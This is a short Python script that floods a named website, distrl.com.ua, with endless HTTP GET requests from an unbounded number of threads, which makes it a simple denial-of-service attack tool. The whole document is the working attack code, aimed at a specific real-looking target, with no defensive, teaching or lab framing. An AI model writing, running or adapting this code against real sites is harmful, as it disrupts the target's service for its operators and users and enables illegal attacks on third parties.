import threading
import requests


def dos():
    while True:
        requests.get("https://distrl.com.ua/")


while True:
    threading.Thread(target=dos).start()